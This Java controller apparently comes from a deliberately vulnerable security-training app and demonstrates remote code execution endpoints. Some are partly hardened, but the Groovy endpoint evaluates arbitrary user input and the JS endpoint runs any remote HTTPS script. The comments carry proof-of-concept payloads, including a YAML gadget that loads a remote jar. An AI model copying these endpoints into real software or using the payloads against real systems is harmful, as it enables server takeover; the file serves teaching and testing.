package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.sql.DriverManager;
import java.util.regex.Pattern;

import org.joychou.security.SecurityUtil;
import org.springframework.web.util.HtmlUtils;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    private static final Pattern SAFE_CMD_PATTERN = Pattern.compile("^[a-zA-Z0-9_./-]+$");

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (cmd == null || !SAFE_CMD_PATTERN.matcher(cmd).matches()) {
            return "Invalid command: only alphanumeric characters, dots, hyphens, underscores, and slashes are allowed.";
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use ProcessBuilder with explicit argument array (no shell) to prevent command injection
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.split("\\s+"));
            processBuilder.redirectErrorStream(true);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
        if (cmd == null || !SAFE_CMD_PATTERN.matcher(cmd).matches()) {
            return "Invalid command: only alphanumeric characters, dots, hyphens, underscores, and slashes are allowed.";
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use explicit argument array without shell to prevent command injection
            ProcessBuilder processBuilder = new ProcessBuilder(cmd.split("\\s+"));
            processBuilder.redirectErrorStream(true);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    private static final Pattern SAFE_URL_PATTERN = Pattern.compile("^https://[a-zA-Z0-9][a-zA-Z0-9._-]*(?:/[a-zA-Z0-9._-]+)*\\.js$");

    @GetMapping("/jscmd")
    public void jsEngine(String jsurl) throws Exception{
        // Validate jsurl against allowlist pattern to prevent code injection via ScriptEngine
        if (jsurl == null || !SAFE_URL_PATTERN.matcher(jsurl).matches()) {
            throw new IllegalArgumentException("Invalid JS URL: must be an HTTPS URL pointing to a .js file with safe characters.");
        }
        // Use standard ScriptEngineManager; URL validation above prevents loading arbitrary scripts
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("JavaScript");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        String cmd = String.format("load(\"%s\")", jsurl);
        engine.eval(cmd, bindings);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        // Use SafeConstructor to prevent arbitrary object deserialization (RCE)
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        if (content == null || content.length() > 10000) {
            throw new IllegalArgumentException("Invalid YAML content: null or exceeds maximum length.");
        }
        // SafeConstructor prevents arbitrary object deserialization (RCE)
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public void groovyshell(String content) {
        GroovyShell groovyShell = new GroovyShell();
        groovyShell.evaluate(content);
    }



    public static void main(String[] args) throws Exception{
        Runtime.getRuntime().exec("touch /tmp/x");
    }
}

